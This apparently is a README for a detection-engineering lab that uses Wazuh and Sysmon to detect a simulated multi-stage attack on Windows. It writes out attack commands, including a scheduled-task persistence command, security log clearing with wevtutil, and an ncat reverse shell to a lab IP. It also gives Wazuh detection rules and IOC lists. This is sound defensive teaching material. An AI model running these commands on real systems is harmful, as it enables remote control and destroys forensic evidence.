
# Multi-Stage Cyber Attack Detection Using Wazuh SIEM and Sysmon

```text
Project Type: SOC Detection Engineering Lab
Framework: MITRE ATT&CK
Focus: Attack Simulation • Detection Engineering • Threat Hunting • Incident Response
```

---

# Project Overview

This project demonstrates **end-to-end detection of a multi-stage cyber attack** using **Wazuh SIEM** and **Sysmon telemetry**.

It simulates a realistic adversary attack chain and showcases how a **Security Operations Center (SOC)**:

* Detects malicious activity
* Correlates multi-stage behavior
* Investigates alerts
* Performs incident response

The attack lifecycle follows the MITRE ATT&CK framework.

---

# Lab Architecture

```text
Kali Linux (Attacker)
        │
        ▼
Windows 11 Victim (Sysmon + Wazuh Agent)
        │
        ▼
Wazuh Manager → Wazuh Dashboard
```

---

# Telemetry Collection

This lab uses **multi-source telemetry**:

### Sysmon Events

| Event ID | Description        |
| -------- | ------------------ |
| 1        | Process Creation   |
| 3        | Network Connection |
| 13       | Registry Changes   |

### Windows Logs

| Event ID | Description          |
| -------- | -------------------- |
| 4688     | Process Creation     |
| 1102     | Security Log Cleared |
| 104      | Log File Cleared     |

---

# Attack Simulation

A realistic attack chain was executed:

1. Initial Access
2. Execution
3. Persistence
4. Defense Evasion
5. Command & Control

---

# Stage 1 – Initial Access

```powershell
powershell -enc <base64_payload>
```

### Description

Simulates obfuscated PowerShell execution commonly used in:

* Malware loaders
* Phishing payloads
* Initial foothold attacks

### MITRE Mapping

* T1059 – Command and Scripting Interpreter

### Detection

* Command-line contains `-enc`
* Unusual encoded PowerShell execution

---

# Stage 2 – Execution

```text
whoami
net user
ipconfig
```

### Description

Basic system reconnaissance to gather:

* User context
* Network configuration

### Detection

* Sysmon Event ID 1
* Unusual command execution sequence

---

# Stage 3 – Persistence

```text
schtasks /create /sc minute /tn updater /tr malware.exe
```

### MITRE Mapping

* T1053 – Scheduled Task

### Detection

* Task creation events
* Suspicious task naming

---

# Stage 4 – Defense Evasion

```powershell
wevtutil cl Security
```

### Objective

Clear Windows logs to **remove forensic evidence**.

### MITRE Mapping

* T1562 – Impair Defenses
* T1070.001 – Clear Windows Event Logs

### Detection

**High-Fidelity Indicators**

* Event ID 1102 → Security log cleared
* Event ID 104 → Log cleared
* Process execution: `wevtutil.exe`

---

# Stage 5 – Command and Control (C2)

```bash
# Attacker
nc -lvnp 4444
```

```powershell
# Victim
ncat 192.168.255.128 4444 --exec cmd.exe
```

### Objective

Establish a reverse shell for remote command execution.

### MITRE Mapping

* T1071 – Application Layer Protocol
* T1059.003 – Command Shell
* T1105 – Ingress Tool Transfer

---

# Detection Engineering

### Rule-Based Detection

```xml
<rule id="100100" level="12">
  <match>-enc</match>
  <description>Encoded PowerShell detected</description>
</rule>
```

```xml
<rule id="100102" level="12">
  <match>wevtutil cl Security</match>
  <description>Log clearing detected</description>
</rule>
```

---

## Behavior-Based Detection (Advanced)

High-confidence detection patterns:

* `ncat.exe → cmd.exe` (reverse shell execution)
* PowerShell with encoded payloads
* Process + network correlation:

  * Non-browser process initiating outbound connection

---

# 🔗 Correlation Rules

```xml
<rule id="100200" level="15" frequency="3" timeframe="120">
  <if_matched_sid>100100</if_matched_sid>
  <if_matched_sid>100102</if_matched_sid>
  <description>Multi-stage attack detected</description>
</rule>
```

---

#  Threat Hunting Queries

```text
powershell AND "-enc"
```

```text
destination_port:4444
```

---

# Indicators of Compromise (IOCs)

| Type    | Indicator            |
| ------- | -------------------- |
| Process | powershell.exe -enc  |
| Command | schtasks /create     |
| Command | wevtutil cl Security |
| Network | Port 4444            |
| Tool    | ncat.exe             |

---

# Detection Logic

* Detect encoded PowerShell
* Detect persistence creation
* Detect log clearing
* Correlate multi-stage activity

---

# SOC Investigation Workflow

```text
Alert Triggered
      ↓
Log Analysis (Sysmon + Windows)
      ↓
Process Tree Review
      ↓
Network Connection Analysis
      ↓
Threat Confirmation
      ↓
Incident Response
```

---

# Alert Triage & Severity

| Stage           | Severity | Action            |
| --------------- | -------- | ----------------- |
| Initial Access  | Medium   | Monitor           |
| Persistence     | High     | Investigate       |
| Defense Evasion | Critical | Escalate          |
| C2 Activity     | Critical | Incident Response |

---

# Real-World Threat Context

These techniques are commonly used in:

* Ransomware attacks
* Advanced Persistent Threats (APTs)
* Post-exploitation frameworks

---

# Incident Response Actions

1. Isolate affected host
2. Terminate malicious processes
3. Remove persistence mechanisms
4. Reset credentials
5. Review logs for lateral movement

---

# Technologies Used

* Wazuh
* Sysmon
* Kali Linux
* Windows 11
* Netcat / Ncat

---

# Skills Demonstrated

* Detection Engineering
* Threat Hunting
* Incident Investigation
* MITRE ATT&CK Mapping
* Attack Simulation
* SOC Analysis

---
